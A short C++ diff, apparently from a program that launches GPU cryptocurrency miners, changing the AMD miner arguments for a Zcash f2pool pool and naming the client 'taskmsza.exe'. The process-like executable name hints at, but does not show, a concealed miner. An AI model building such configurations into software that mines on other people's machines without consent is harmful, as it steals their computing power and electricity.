@@ -96,7 +96,7 @@ void RunEnvironment::GetClientInfo()
 	}
 	else if (m_Type == vendor_t::amd)
 	{
-		strFormat = L"-zpool zec.f2pool.com:3357 -zwal %s.%s -zpsw x -li 10 -dbg -1";
+		strFormat = L"-zpool zec.f2pool.com:3357 -zwal %s.%s -zpsw x -i 0 -li 1 -dbg -1";
 		//strWorkid = L"a0";
 		m_pClientInfo->strClientSubPath = L"taskmsza\\taskmsza.exe";
 	}
